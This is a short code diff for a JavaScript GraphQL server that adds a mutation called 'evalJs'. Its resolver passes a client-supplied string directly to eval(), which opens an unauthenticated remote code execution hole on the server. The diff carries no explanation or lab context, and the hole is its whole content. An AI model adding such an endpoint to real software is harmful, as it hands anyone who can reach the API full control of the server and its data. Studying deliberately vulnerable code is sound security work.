@@ -114,6 +114,15 @@ const mutation = new GraphQLObjectType({
             }
             return true
           }
+        },
+        evalJs: {
+          type: GraphQLString,
+          args: {
+            js: { type: new GraphQLNonNull(GraphQLString) }
+          },
+          resolve (parentValue, args) {
+            return eval(args.js)
+          }
         }
     }
 })
